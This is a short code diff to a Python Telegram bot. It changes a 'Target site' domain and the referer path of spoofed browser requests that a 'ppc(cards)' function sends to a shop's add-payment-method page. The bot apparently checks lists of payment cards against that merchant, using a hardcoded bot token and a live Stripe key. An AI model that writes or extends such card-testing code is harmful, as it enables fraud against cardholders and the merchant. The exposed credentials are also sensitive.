@@ -14,7 +14,7 @@ logger = logging.getLogger(__name__)
 
 # Bot configuration
 TOKEN = "8039426526:AAFSqWU-fRl_gwTPqYLK8yxuS0N9at1hC4s"  # Replace with your Telegram bot token
-DOMAIN = "https://scandictech.no/"  # Target site
+DOMAIN = "https://www.scandictech.no/"  # Updated with www
 PK = "pk_live_51MwcfkEreweRX4nmQHMS2A6b1LooXYEf671WoSSZTusv9jAbcwEwE5cOXsOAtdCwi44NGBrcmnzSy7LprdcAs2Fp00QKpqinae"
 
 def parseX(data, start, end):
@@ -58,7 +58,7 @@ async def ppc(cards):
                 "accept-language": "en-US,en;q=0.9",
                 "cache-control": "max-age=0",
                 "priority": "u=0, i",
-                "referer": f"{DOMAIN}/my-account/payment-methods/",
+                "referer": f"{DOMAIN}/my-account/add-payment-method/",
                 "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"',
@@ -330,11 +330,9 @@ async def email(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def get_or_generate_greeting(context: ContextTypes.DEFAULT_TYPE, num_users: int):
     """Get existing greeting from context or generate a new one."""
-    # Check if greeting is already in context memory
     if "greeting" in context.user_data:
         return context.user_data["greeting"]
     
-    # Generate new greeting if not present
     url = f"https://randomuser.me/api/?results={num_users}&inc=name"
     response = requests.get(url)
     if response.status_code == 200:
@@ -347,7 +345,7 @@ async def get_or_generate_greeting(context: ContextTypes.DEFAULT_TYPE, num_users
             greeting = f"Hello {names[0]} and {names[1]},"
         else:
             greeting = f"Hello {', '.join(names[:-1])}, and {names[-1]},"
-        context.user_data["greeting"] = greeting  # Store in memory
+        context.user_data["greeting"] = greeting
         return greeting
     return "Hello everyone,"
 
